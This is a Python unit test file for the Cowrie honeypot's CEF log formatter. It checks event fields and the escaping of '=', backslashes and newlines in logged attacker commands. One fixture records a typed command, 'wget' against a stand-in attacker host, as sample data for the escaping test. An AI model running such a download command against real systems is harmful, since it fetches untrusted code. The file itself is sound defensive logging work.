# SPDX-FileCopyrightText: 2026 Michel Oosterhof <michel@oosterhof.net>
#
# SPDX-License-Identifier: BSD-3-Clause

# ABOUTME: Tests for the CEF formatter used by the localsyslog and textlog
# ABOUTME: output plugins; file events must carry their hash and path.

from __future__ import annotations

import unittest

from cowrie.core.cef import formatCef


def _entry(**extra: str) -> dict[str, str]:
    entry = {
        "sensor": "testsensor",
        "message": "a message",
        "src_ip": "1.2.3.4",
    }
    entry.update(extra)
    return entry


class CefFormatTests(unittest.TestCase):
    def test_session_connect(self) -> None:
        cef = formatCef(
            _entry(
                eventid="cowrie.session.connect",
                src_port="55555",
                dst_ip="10.0.0.1",
                dst_port="2222",
            )
        )
        self.assertIn("spt=55555", cef)
        self.assertIn("dpt=2222", cef)
        self.assertIn("dst=10.0.0.1", cef)

    def test_file_download_carries_hash_and_path(self) -> None:
        cef = formatCef(
            _entry(
                eventid="cowrie.session.file_download",
                url="http://example.invalid/payload",
                outfile="var/lib/cowrie/downloads/abc123",
                shasum="abc123",
            )
        )
        self.assertIn("filehash=abc123", cef)
        self.assertIn("filePath=var/lib/cowrie/downloads/abc123", cef)

    def test_file_upload_carries_hash_and_path(self) -> None:
        cef = formatCef(
            _entry(
                eventid="cowrie.session.file_upload",
                filename="payload.bin",
                outfile="var/lib/cowrie/downloads/def456",
                shasum="def456",
            )
        )
        self.assertIn("filehash=def456", cef)
        self.assertIn("filePath=var/lib/cowrie/downloads/def456", cef)


class CefExtensionEscapingTests(unittest.TestCase):
    """An extension value carries attacker-influenced text (a typed command).
    CEF delimits pairs with a space and a key from its value with "=", so a
    literal "=" or "\\" in a value has to be escaped or the reader sees extra
    key/value pairs instead of the text."""

    def test_equals_in_message_is_escaped(self) -> None:
        cef = formatCef(
            _entry(
                eventid="cowrie.command.input",
                message="CMD: wget http://evil.example/x?a=b&c=d",
            )
        )

        self.assertIn(r"msg=CMD: wget http://evil.example/x?a\=b&c\=d", cef)

    def test_backslash_in_message_is_escaped(self) -> None:
        cef = formatCef(
            _entry(eventid="cowrie.command.input", message=r"CMD: echo a\b")
        )

        self.assertIn(r"msg=CMD: echo a\\b", cef)

    def test_newline_in_message_is_escaped(self) -> None:
        """A raw newline would end the syslog record mid-event."""
        cef = formatCef(
            _entry(eventid="cowrie.command.input", message="first\r\nsecond")
        )

        self.assertIn(r"msg=first\r\nsecond", cef)
        self.assertNotIn("\n", cef)

    def test_ordinary_value_is_unchanged(self) -> None:
        cef = formatCef(_entry(eventid="cowrie.command.input", message="CMD: ls -la"))

        self.assertIn("msg=CMD: ls -la", cef)


if __name__ == "__main__":
    unittest.main()
